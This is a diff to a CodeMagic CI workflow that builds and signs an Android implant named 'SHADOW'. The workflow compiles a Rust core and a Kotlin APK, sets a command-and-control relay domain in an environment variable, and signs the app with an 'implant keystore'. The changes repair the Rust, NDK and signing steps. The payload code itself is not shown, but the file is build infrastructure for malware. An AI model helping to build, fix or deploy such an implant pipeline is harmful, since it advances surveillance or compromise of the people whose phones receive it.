@@ -1,23 +1,35 @@
 # SHADOW implant build — CodeMagic
-# Builds Rust core (NDK) + Kotlin APK, signs with the implant keystore.
 workflows:
   build-implant:
     name: Build SHADOW Implant
-    max_build_duration: 30
+    max_build_duration: 40
     instance_type: mac_mini_m1
     environment:
       java: 17
       vars:
         C2_DOMAIN: cfg-relay.marwannaili-23-07.workers.dev
     scripts:
+      - name: Install Rust
+        script: |
+          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable
+          source "$HOME/.cargo/env"
+          rustup target add aarch64-linux-android
+          cargo --version
       - name: Build Rust core
         script: |
-          export ANDROID_HOME=$CM_ANDROID_SDK_DIR
-          rustup target add aarch64-linux-android
-          cargo install cargo-ndk || true
+          source "$HOME/.cargo/env"
+          # CodeMagic Android SDK is under $CM_KOTLIN_PATH / use SDKMAN-style env
+          export ANDROID_SDK_ROOT="${ANDROID_HOME:-$HOME/android-sdk}"
+          export ANDROID_NDK_HOME="${ANDROID_NDK_HOME:-$ANDROID_SDK_ROOT/ndk/}"
+          cargo install cargo-ndk --version 3.5.4 || cargo install cargo-ndk
           cd core
           cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
-          cp "$ANDROID_HOME/ndk/26.*/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/aarch64-linux-android/libc++_shared.so" android/app/src/main/jniLibs/arm64-v8a/
+          echo "NDK path: $ANDROID_NDK_HOME"
+          find "$ANDROID_SDK_ROOT" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1
+      - name: Copy libc++_shared
+        script: |
+          LIB=$(find "$ANDROID_SDK_ROOT" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
+          if [ -n "$LIB" ]; then cp "$LIB" core/android/app/src/main/jniLibs/arm64-v8a/; fi
       - name: Build APK
         script: |
           cd core/android
@@ -26,6 +38,7 @@ workflows:
           ./gradlew assembleRelease
       - name: Sign APK
         script: |
+          cd core/android
           curl -sSL -o /tmp/bt.zip https://dl.google.com/android/repository/build-tools_r34-linux.zip
           python3 -c "import zipfile; z=zipfile.ZipFile('/tmp/bt.zip'); open('/tmp/apksigner.jar','wb').write(z.read([n for n in z.namelist() if n.endswith('apksigner.jar')][0]))"
           echo "$IMPLANT_KEYSTORE_BASE64" | base64 -d > app/implant.jks
